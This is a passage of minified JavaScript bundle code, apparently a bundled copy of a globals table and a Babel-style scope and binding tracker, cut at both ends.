re:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,IdleDeadline:!1,IIRFilterNode:!1,Image:!1,ImageBitmap:!1,ImageBitmapRenderingContext:!1,ImageCapture:!1,ImageData:!1,indexedDB:!1,innerHeight:!1,innerWidth:!1,InputEvent:!1,IntersectionObserver:!1,IntersectionObserverEntry:!1,Intl:!1,isSecureContext:!1,KeyboardEvent:!1,KeyframeEffect:!1,KeyframeEffectReadOnly:!1,length:!1,localStorage:!1,location:!0,Location:!1,locationbar:!1,matchMedia:!1,MediaDeviceInfo:!1,MediaDevices:!1,MediaElementAudioSourceNode:!1,MediaEncryptedEvent:!1,MediaError:!1,MediaKeyMessageEvent:!1,MediaKeySession:!1,MediaKeyStatusMap:!1,MediaKeySystemAccess:!1,MediaList:!1,MediaQueryList:!1,MediaQueryListEvent:!1,MediaRecorder:!1,MediaSettingsRange:!1,MediaSource:!1,MediaStream:!1,MediaStreamAudioDestinationNode:!1,MediaStreamAudioSourceNode:!1,MediaStreamEvent:!1,MediaStreamTrack:!1,MediaStreamTrackEvent:!1,menubar:!1,MessageChannel:!1,MessageEvent:!1,MessagePort:!1,MIDIAccess:!1,MIDIConnectionEvent:!1,MIDIInput:!1,MIDIInputMap:!1,MIDIMessageEvent:!1,MIDIOutput:!1,MIDIOutputMap:!1,MIDIPort:!1,MimeType:!1,MimeTypeArray:!1,MouseEvent:!1,moveBy:!1,moveTo:!1,MutationEvent:!1,MutationObserver:!1,MutationRecord:!1,name:!1,NamedNodeMap:!1,NavigationPreloadManager:!1,navigator:!1,Navigator:!1,NetworkInformation:!1,Node:!1,NodeFilter:!1,NodeIterator:!1,NodeList:!1,Notification:!1,OfflineAudioCompletionEvent:!1,OfflineAudioContext:!1,offscreenBuffering:!1,OffscreenCanvas:!0,onabort:!0,onafterprint:!0,onanimationend:!0,onanimationiteration:!0,onanimationstart:!0,onappinstalled:!0,onauxclick:!0,onbeforeinstallprompt:!0,onbeforeprint:!0,onbeforeunload:!0,onblur:!0,oncancel:!0,oncanplay:!0,oncanplaythrough:!0,onchange:!0,onclick:!0,onclose:!0,oncontextmenu:!0,oncuechange:!0,ondblclick:!0,ondevicemotion:!0,ondeviceorientation:!0,ondeviceorientationabsolute:!0,ondrag:!0,ondragend:!0,ondragenter:!0,ondragleave:!0,ondragover:!0,ondragstart:!0,ondrop:!0,ondurationchange:!0,onemptied:!0,onended:!0,onerror:!0,onfocus:!0,ongotpointercapture:!0,onhashchange:!0,oninput:!0,oninvalid:!0,onkeydown:!0,onkeypress:!0,onkeyup:!0,onlanguagechange:!0,onload:!0,onloadeddata:!0,onloadedmetadata:!0,onloadstart:!0,onlostpointercapture:!0,onmessage:!0,onmessageerror:!0,onmousedown:!0,onmouseenter:!0,onmouseleave:!0,onmousemove:!0,onmouseout:!0,onmouseover:!0,onmouseup:!0,onmousewheel:!0,onoffline:!0,ononline:!0,onpagehide:!0,onpageshow:!0,onpause:!0,onplay:!0,onplaying:!0,onpointercancel:!0,onpointerdown:!0,onpointerenter:!0,onpointerleave:!0,onpointermove:!0,onpointerout:!0,onpointerover:!0,onpointerup:!0,onpopstate:!0,onprogress:!0,onratechange:!0,onrejectionhandled:!0,onreset:!0,onresize:!0,onscroll:!0,onsearch:!0,onseeked:!0,onseeking:!0,onselect:!0,onstalled:!0,onstorage:!0,onsubmit:!0,onsuspend:!0,ontimeupdate:!0,ontoggle:!0,ontransitionend:!0,onunhandledrejection:!0,onunload:!0,onvolumechange:!0,onwaiting:!0,onwheel:!0,open:!1,openDatabase:!1,opener:!1,Option:!1,origin:!1,OscillatorNode:!1,outerHeight:!1,outerWidth:!1,PageTransitionEvent:!1,pageXOffset:!1,pageYOffset:!1,PannerNode:!1,parent:!1,Path2D:!1,PaymentAddress:!1,PaymentRequest:!1,PaymentRequestUpdateEvent:!1,PaymentResponse:!1,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceLongTaskTiming:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceNavigationTiming:!1,PerformanceObserver:!1,PerformanceObserverEntryList:!1,PerformancePaintTiming:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,PeriodicWave:!1,Permissions:!1,PermissionStatus:!1,personalbar:!1,PhotoCapabilities:!1,Plugin:!1,PluginArray:!1,PointerEvent:!1,PopStateEvent:!1,postMessage:!1,Presentation:!1,PresentationAvailability:!1,PresentationConnection:!1,PresentationConnectionAvailableEvent:!1,PresentationConnectionCloseEvent:!1,PresentationConnectionList:!1,PresentationReceiver:!1,PresentationRequest:!1,print:!1,ProcessingInstruction:!1,ProgressEvent:!1,PromiseRejectionEvent:!1,prompt:!1,PushManager:!1,PushSubscription:!1,PushSubscriptionOptions:!1,queueMicrotask:!1,RadioNodeList:!1,Range:!1,ReadableStream:!1,registerProcessor:!1,RemotePlayback:!1,removeEventListener:!1,Request:!1,requestAnimationFrame:!1,requestIdleCallback:!1,resizeBy:!1,ResizeObserver:!1,ResizeObserverEntry:!1,resizeTo:!1,Response:!1,RTCCertificate:!1,RTCDataChannel:!1,RTCDataChannelEvent:!1,RTCDtlsTransport:!1,RTCIceCandidate:!1,RTCIceGatherer:!1,RTCIceTransport:!1,RTCPeerConnection:!1,RTCPeerConnectionIceEvent:!1,RTCRtpContributingSource:!1,RTCRtpReceiver:!1,RTCRtpSender:!1,RTCSctpTransport:!1,RTCSessionDescription:!1,RTCStatsReport:!1,RTCTrackEvent:!1,screen:!1,Screen:!1,screenLeft:!1,ScreenOrientation:!1,screenTop:!1,screenX:!1,screenY:!1,ScriptProcessorNode:!1,scroll:!1,scrollbars:!1,scrollBy:!1,scrollTo:!1,scrollX:!1,scrollY:!1,SecurityPolicyViolationEvent:!1,Selection:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerRegistration:!1,sessionStorage:!1,setInterval:!1,setTimeout:!1,ShadowRoot:!1,SharedWorker:!1,SourceBuffer:!1,SourceBufferList:!1,speechSynthesis:!1,SpeechSynthesisEvent:!1,SpeechSynthesisUtterance:!1,StaticRange:!1,status:!1,statusbar:!1,StereoPannerNode:!1,stop:!1,Storage:!1,StorageEvent:!1,StorageManager:!1,styleMedia:!1,StyleSheet:!1,StyleSheetList:!1,SubtleCrypto:!1,SVGAElement:!1,SVGAngle:!1,SVGAnimatedAngle:!1,SVGAnimatedBoolean:!1,SVGAnimatedEnumeration:!1,SVGAnimatedInteger:!1,SVGAnimatedLength:!1,SVGAnimatedLengthList:!1,SVGAnimatedNumber:!1,SVGAnimatedNumberList:!1,SVGAnimatedPreserveAspectRatio:!1,SVGAnimatedRect:!1,SVGAnimatedString:!1,SVGAnimatedTransformList:!1,SVGAnimateElement:!1,SVGAnimateMotionElement:!1,SVGAnimateTransformElement:!1,SVGAnimationElement:!1,SVGCircleElement:!1,SVGClipPathElement:!1,SVGComponentTransferFunctionElement:!1,SVGDefsElement:!1,SVGDescElement:!1,SVGDiscardElement:!1,SVGElement:!1,SVGEllipseElement:!1,SVGFEBlendElement:!1,SVGFEColorMatrixElement:!1,SVGFEComponentTransferElement:!1,SVGFECompositeElement:!1,SVGFEConvolveMatrixElement:!1,SVGFEDiffuseLightingElement:!1,SVGFEDisplacementMapElement:!1,SVGFEDistantLightElement:!1,SVGFEDropShadowElement:!1,SVGFEFloodElement:!1,SVGFEFuncAElement:!1,SVGFEFuncBElement:!1,SVGFEFuncGElement:!1,SVGFEFuncRElement:!1,SVGFEGaussianBlurElement:!1,SVGFEImageElement:!1,SVGFEMergeElement:!1,SVGFEMergeNodeElement:!1,SVGFEMorphologyElement:!1,SVGFEOffsetElement:!1,SVGFEPointLightElement:!1,SVGFESpecularLightingElement:!1,SVGFESpotLightElement:!1,SVGFETileElement:!1,SVGFETurbulenceElement:!1,SVGFilterElement:!1,SVGForeignObjectElement:!1,SVGGElement:!1,SVGGeometryElement:!1,SVGGradientElement:!1,SVGGraphicsElement:!1,SVGImageElement:!1,SVGLength:!1,SVGLengthList:!1,SVGLinearGradientElement:!1,SVGLineElement:!1,SVGMarkerElement:!1,SVGMaskElement:!1,SVGMatrix:!1,SVGMetadataElement:!1,SVGMPathElement:!1,SVGNumber:!1,SVGNumberList:!1,SVGPathElement:!1,SVGPatternElement:!1,SVGPoint:!1,SVGPointList:!1,SVGPolygonElement:!1,SVGPolylineElement:!1,SVGPreserveAspectRatio:!1,SVGRadialGradientElement:!1,SVGRect:!1,SVGRectElement:!1,SVGScriptElement:!1,SVGSetElement:!1,SVGStopElement:!1,SVGStringList:!1,SVGStyleElement:!1,SVGSVGElement:!1,SVGSwitchElement:!1,SVGSymbolElement:!1,SVGTextContentElement:!1,SVGTextElement:!1,SVGTextPathElement:!1,SVGTextPositioningElement:!1,SVGTitleElement:!1,SVGTransform:!1,SVGTransformList:!1,SVGTSpanElement:!1,SVGUnitTypes:!1,SVGUseElement:!1,SVGViewElement:!1,TaskAttributionTiming:!1,Text:!1,TextDecoder:!1,TextEncoder:!1,TextEvent:!1,TextMetrics:!1,TextTrack:!1,TextTrackCue:!1,TextTrackCueList:!1,TextTrackList:!1,TimeRanges:!1,toolbar:!1,top:!1,Touch:!1,TouchEvent:!1,TouchList:!1,TrackEvent:!1,TransitionEvent:!1,TreeWalker:!1,UIEvent:!1,URL:!1,URLSearchParams:!1,ValidityState:!1,visualViewport:!1,VisualViewport:!1,VTTCue:!1,WaveShaperNode:!1,WebAssembly:!1,WebGL2RenderingContext:!1,WebGLActiveInfo:!1,WebGLBuffer:!1,WebGLContextEvent:!1,WebGLFramebuffer:!1,WebGLProgram:!1,WebGLQuery:!1,WebGLRenderbuffer:!1,WebGLRenderingContext:!1,WebGLSampler:!1,WebGLShader:!1,WebGLShaderPrecisionFormat:!1,WebGLSync:!1,WebGLTexture:!1,WebGLTransformFeedback:!1,WebGLUniformLocation:!1,WebGLVertexArrayObject:!1,WebSocket:!1,WheelEvent:!1,window:!1,Window:!1,Worker:!1,WritableStream:!1,XMLDocument:!1,XMLHttpRequest:!1,XMLHttpRequestEventTarget:!1,XMLHttpRequestUpload:!1,XMLSerializer:!1,XPathEvaluator:!1,XPathExpression:!1,XPathResult:!1,XSLTProcessor:!1},worker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,clearInterval:!1,clearTimeout:!1,close:!0,console:!1,fetch:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!0,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onlanguagechange:!0,onmessage:!0,onoffline:!0,ononline:!0,onrejectionhandled:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,removeEventListener:!1,Request:!1,Response:!1,self:!0,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},node:{__dirname:!1,__filename:!1,Buffer:!1,clearImmediate:!1,clearInterval:!1,clearTimeout:!1,console:!1,exports:!0,global:!1,Intl:!1,module:!1,process:!1,queueMicrotask:!1,require:!1,setImmediate:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1},commonjs:{exports:!0,global:!1,module:!1,require:!1},amd:{define:!1,require:!1},mocha:{after:!1,afterEach:!1,before:!1,beforeEach:!1,context:!1,describe:!1,it:!1,mocha:!1,run:!1,setup:!1,specify:!1,suite:!1,suiteSetup:!1,suiteTeardown:!1,teardown:!1,test:!1,xcontext:!1,xdescribe:!1,xit:!1,xspecify:!1},jasmine:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fail:!1,fdescribe:!1,fit:!1,it:!1,jasmine:!1,pending:!1,runs:!1,spyOn:!1,spyOnProperty:!1,waits:!1,waitsFor:!1,xdescribe:!1,xit:!1},jest:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fdescribe:!1,fit:!1,it:!1,jest:!1,pit:!1,require:!1,test:!1,xdescribe:!1,xit:!1,xtest:!1},qunit:{asyncTest:!1,deepEqual:!1,equal:!1,expect:!1,module:!1,notDeepEqual:!1,notEqual:!1,notOk:!1,notPropEqual:!1,notStrictEqual:!1,ok:!1,propEqual:!1,QUnit:!1,raises:!1,start:!1,stop:!1,strictEqual:!1,test:!1,throws:!1},phantomjs:{console:!0,exports:!0,phantom:!0,require:!0,WebPage:!0},couch:{emit:!1,exports:!1,getRow:!1,log:!1,module:!1,provides:!1,require:!1,respond:!1,send:!1,start:!1,sum:!1},rhino:{defineClass:!1,deserialize:!1,gc:!1,help:!1,importClass:!1,importPackage:!1,java:!1,load:!1,loadClass:!1,Packages:!1,print:!1,quit:!1,readFile:!1,readUrl:!1,runCommand:!1,seal:!1,serialize:!1,spawn:!1,sync:!1,toint32:!1,version:!1},nashorn:{__DIR__:!1,__FILE__:!1,__LINE__:!1,com:!1,edu:!1,exit:!1,java:!1,Java:!1,javafx:!1,JavaImporter:!1,javax:!1,JSAdapter:!1,load:!1,loadWithNewGlobal:!1,org:!1,Packages:!1,print:!1,quit:!1},wsh:{ActiveXObject:!0,Enumerator:!0,GetObject:!0,ScriptEngine:!0,ScriptEngineBuildVersion:!0,ScriptEngineMajorVersion:!0,ScriptEngineMinorVersion:!0,VBArray:!0,WScript:!0,WSH:!0,XDomainRequest:!0},jquery:{$:!1,jQuery:!1},yui:{YAHOO:!1,YAHOO_config:!1,YUI:!1,YUI_config:!1},shelljs:{cat:!1,cd:!1,chmod:!1,config:!1,cp:!1,dirs:!1,echo:!1,env:!1,error:!1,exec:!1,exit:!1,find:!1,grep:!1,ln:!1,ls:!1,mkdir:!1,mv:!1,popd:!1,pushd:!1,pwd:!1,rm:!1,sed:!1,set:!1,target:!1,tempdir:!1,test:!1,touch:!1,which:!1},prototypejs:{$:!1,$$:!1,$A:!1,$break:!1,$continue:!1,$F:!1,$H:!1,$R:!1,$w:!1,Abstract:!1,Ajax:!1,Autocompleter:!1,Builder:!1,Class:!1,Control:!1,Draggable:!1,Draggables:!1,Droppables:!1,Effect:!1,Element:!1,Enumerable:!1,Event:!1,Field:!1,Form:!1,Hash:!1,Insertion:!1,ObjectRange:!1,PeriodicalExecuter:!1,Position:!1,Prototype:!1,Scriptaculous:!1,Selector:!1,Sortable:!1,SortableObserver:!1,Sound:!1,Template:!1,Toggle:!1,Try:!1},meteor:{_:!1,$:!1,Accounts:!1,AccountsClient:!1,AccountsCommon:!1,AccountsServer:!1,App:!1,Assets:!1,Blaze:!1,check:!1,Cordova:!1,DDP:!1,DDPRateLimiter:!1,DDPServer:!1,Deps:!1,EJSON:!1,Email:!1,HTTP:!1,Log:!1,Match:!1,Meteor:!1,Mongo:!1,MongoInternals:!1,Npm:!1,Package:!1,Plugin:!1,process:!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!1,ObjC:!1,ObjectSpecifier:!1,Path:!1,Progress:!1,Ref:!1},serviceworker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,CacheStorage:!1,clearInterval:!1,clearTimeout:!1,Client:!1,clients:!1,Clients:!1,close:!0,console:!1,ExtendableEvent:!1,ExtendableMessageEvent:!1,fetch:!1,FetchEvent:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!1,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onfetch:!0,oninstall:!0,onlanguagechange:!0,onmessage:!0,onmessageerror:!0,onnotificationclick:!0,onnotificationclose:!0,onoffline:!0,ononline:!0,onpush:!0,onpushsubscriptionchange:!0,onrejectionhandled:!0,onsync:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,registration:!1,removeEventListener:!1,Request:!1,Response:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerGlobalScope:!1,ServiceWorkerMessageEvent:!1,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,skipWaiting:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,WindowClient:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},atomtest:{advanceClock:!1,fakeClearInterval:!1,fakeClearTimeout:!1,fakeSetInterval:!1,fakeSetTimeout:!1,resetTimeouts:!1,waitsForPromise:!1},embertest:{andThen:!1,click:!1,currentPath:!1,currentRouteName:!1,currentURL:!1,fillIn:!1,find:!1,findAll:!1,findWithAssert:!1,keyEvent:!1,pauseTest:!1,resumeTest:!1,triggerEvent:!1,visit:!1,wait:!1},protractor:{$:!1,$$:!1,browser:!1,by:!1,By:!1,DartObject:!1,element:!1,protractor:!1},\"shared-node-browser\":{clearInterval:!1,clearTimeout:!1,console:!1,setInterval:!1,setTimeout:!1,URL:!1,URLSearchParams:!1},webextensions:{browser:!1,chrome:!1,opr:!1},greasemonkey:{cloneInto:!1,createObjectIn:!1,exportFunction:!1,GM:!1,GM_addStyle:!1,GM_deleteValue:!1,GM_getResourceText:!1,GM_getResourceURL:!1,GM_getValue:!1,GM_info:!1,GM_listValues:!1,GM_log:!1,GM_openInTab:!1,GM_registerMenuCommand:!1,GM_setClipboard:!1,GM_setValue:!1,GM_xmlhttpRequest:!1,unsafeWindow:!1},devtools:{$:!1,$_:!1,$$:!1,$0:!1,$1:!1,$2:!1,$3:!1,$4:!1,$x:!1,chrome:!1,clear:!1,copy:!1,debug:!1,dir:!1,dirxml:!1,getEventListeners:!1,inspect:!1,keys:!1,monitor:!1,monitorEvents:!1,profile:!1,profileEnd:!1,queryObjects:!1,table:!1,undebug:!1,unmonitor:!1,unmonitorEvents:!1,values:!1}}});var yS=E((xCe,mS)=>{\"use strict\";mS.exports=hS()});var dm=E(du=>{\"use strict\";Object.defineProperty(du,\"__esModule\",{value:!0});du.default=void 0;var yY=pS(),gY=Xr(),bY=dS(),EY=yS(),CS=De(),vY=CS,gS=Xs(),TY=ro(),{NOT_LOCAL_BINDING:bS,callExpression:ES,cloneNode:vS,getBindingIdentifiers:SY,identifier:qi,isArrayExpression:TS,isBinary:xY,isCallExpression:SS,isClass:PY,isClassBody:AY,isClassDeclaration:CY,isExportAllDeclaration:wS,isExportDefaultDeclaration:wY,isExportNamedDeclaration:cm,isFunctionDeclaration:DY,isIdentifier:Qs,isImportDeclaration:fm,isLiteral:IY,isMemberExpression:OY,isMethod:_Y,isModuleSpecifier:NY,isNullLiteral:kY,isObjectExpression:BY,isProperty:FY,isPureish:jY,isRegExpLiteral:LY,isSuper:MY,isTaggedTemplateExpression:RY,isTemplateLiteral:DS,isThisExpression:xS,isUnaryExpression:qY,isVariableDeclaration:UY,matchesPattern:PS,memberExpression:pm,numericLiteral:VY,toIdentifier:$Y,variableDeclaration:WY,variableDeclarator:KY,isRecordExpression:GY,isTupleExpression:HY,isObjectProperty:YY,isTopicReference:AS,isMetaProperty:XY,isPrivateName:JY,isExportDeclaration:zY,buildUndefinedNode:QY}=CS;function St(e,t){switch(e==null?void 0:e.type){default:if(fm(e)||zY(e)){var r;if((wS(e)||cm(e)||fm(e))&&e.source)St(e.source,t);else if((cm(e)||fm(e))&&(r=e.specifiers)!=null&&r.length)for(let n of e.specifiers)St(n,t);else(wY(e)||cm(e))&&e.declaration&&St(e.declaration,t)}else NY(e)?St(e.local,t):IY(e)&&!kY(e)&&!LY(e)&&!DS(e)&&t.push(e.value);break;case\"MemberExpression\":case\"OptionalMemberExpression\":case\"JSXMemberExpression\":St(e.object,t),St(e.property,t);break;case\"Identifier\":case\"JSXIdentifier\":t.push(e.name);break;case\"CallExpression\":case\"OptionalCallExpression\":case\"NewExpression\":St(e.callee,t);break;case\"ObjectExpression\":case\"ObjectPattern\":for(let n of e.properties)St(n,t);break;case\"SpreadElement\":case\"RestElement\":St(e.argument,t);break;case\"ObjectProperty\":case\"ObjectMethod\":case\"ClassProperty\":case\"ClassMethod\":case\"ClassPrivateProperty\":case\"ClassPrivateMethod\":St(e.key,t);break;case\"ThisExpression\":t.push(\"this\");break;case\"Super\":t.push(\"super\");break;case\"Import\":t.push(\"import\");break;case\"DoExpression\":t.push(\"do\");break;case\"YieldExpression\":t.push(\"yield\"),St(e.argument,t);break;case\"AwaitExpression\":t.push(\"await\"),St(e.argument,t);break;case\"AssignmentExpression\":St(e.left,t);break;case\"VariableDeclarator\":St(e.id,t);break;case\"FunctionExpression\":case\"FunctionDeclaration\":case\"ClassExpression\":case\"ClassDeclaration\":St(e.id,t);break;case\"PrivateName\":St(e.id,t);break;case\"ParenthesizedExpression\":St(e.expression,t);break;case\"UnaryExpression\":case\"UpdateExpression\":St(e.argument,t);break;case\"MetaProperty\":St(e.meta,t),St(e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)return;let i=r.getBinding(s.name);i==null||i.reference(e)}else if(UY(n))for(let s of n.declarations)for(let i of Object.keys(SY(s))){let a=r.getBinding(i);a==null||a.reference(e)}}},LabeledStatement(e){e.scope.getBlockParent().registerDeclaration(e)},AssignmentExpression(e,t){t.assignments.push(e)},UpdateExpression(e,t){t.constantViolations.push(e)},UnaryExpression(e,t){e.node.operator===\"delete\"&&t.constantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while(n&&!r);return(t=r)==null?void 0:t.scope}get parentBlock(){return this.path.parent}get hub(){return this.path.hub}traverse(t,r,n){(0,gY.default)(t,r,this,n,this.path)}generateDeclaredUidIdentifier(t){let r=this.generateUidIdentifier(t);return this.push({id:r}),vS(r)}generateUidIdentifier(t){return qi(this.generateUid(t))}generateUid(t=\"temp\"){t=$Y(t).replace(/^_+/,\"\").replace(/[0-9]+$/g,\"\");let r,n=1;do r=this._generateUid(t,n),n++;while(this.hasLabel(r)||this.hasBinding(r)||this.hasGlobal(r)||this.hasReference(r));let s=this.getProgramParent();return s.references[r]=!0,s.uids[r]=!0,r}_generateUid(t,r){let n=t;return r>1&&(n+=r),`_${n}`}generateUidBasedOnNode(t,r){let n=[];St(t,n);let s=n.join(\"$\");return s=s.replace(/^_/,\"\")||r||\"ref\",this.generateUid(s.slice(0,20))}generateUidIdentifierBasedOnNode(t,r){return qi(this.generateUidBasedOnNode(t,r))}isStatic(t){if(xS(t)||MY(t)||AS(t))return!0;if(Qs(t)){let r=this.getBinding(t.name);return r?r.constant:this.hasBinding(t.name)}return!1}maybeGenerateMemoised(t,r){if(this.isStatic(t))return null;{let n=this.generateUidIdentifierBasedOnNode(t);return r?n:(this.push({id:n}),vS(n))}}checkBlockScopedCollisions(t,r,n,s){if(r===\"param\"||t.kind===\"local\")return;if(r===\"let\"||t.kind===\"let\"||t.kind===\"const\"||t.kind===\"module\"||t.kind===\"param\"&&r===\"const\")throw this.hub.buildError(s,`Duplicate declaration \"${n}\"`,TypeError)}rename(t,r){let n=this.getBinding(t);n&&(r||(r=this.generateUidIdentifier(t).name),new yY.default(n,t,r).rename(arguments[2]))}_renameFromMap(t,r,n,s){t[r]&&(t[n]=s,t[r]=null)}dump(){let t=\"-\".repeat(60);console.log(t);let r=this;do{console.log(\"#\",r.block.type);for(let n of Object.keys(r.bindings)){let s=r.bindings[n];console.log(\" -\",n,{constant:s.constant,references:s.references,violations:s.constantViolations.length,kind:s.kind})}}while(r=r.parent);console.log(t)}toArray(t,r,n){if(Qs(t)){let a=this.getBinding(t.name);if(a!=null&&a.constant&&a.path.isGenericType(\"Array\"))return t}if(TS(t))return t;if(Qs(t,{name:\"arguments\"}))return ES(pm(pm(pm(qi(\"Array\"),qi(\"prototype\")),qi(\"slice\")),qi(\"call\")),[t]);let s,i=[t];return r===!0?s=\"toConsumableArray\":typeof r==\"number\"?(i.push(VY(r)),s=\"slicedToArray\"):s=\"toArray\",n&&(i.unshift(this.hub.addHelper(s)),s=\"maybeArrayLike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclaration())&&this.registerDeclaration(r)}else this.registerBinding(\"unknown\",t)}buildUndefinedNode(){return QY()}registerConstantViolation(t){let r=t.getBindingIdentifiers();for(let s of Object.keys(r)){var n;(n=this.getBinding(s))==null||n.reassign(t)}}registerBinding(t,r,n=r){if(!t)throw new ReferenceError(\"no `kind`\");if(r.isVariableDeclaration()){let a=r.get(\"declarations\");for(let o of a)this.registerBinding(t,o);return}let s=this.getProgramParent(),i=r.getOuterBindingIdentifiers(!0);for(let a of Object.keys(i)){s.references[a]=!0;for(let o of i[a]){let l=this.getOwnBinding(a);if(l){if(l.identifier===o)continue;this.checkBlockScopedCollisions(l,t,a,o)}l?this.registerConstantViolation(n):this.bindings[a]=new 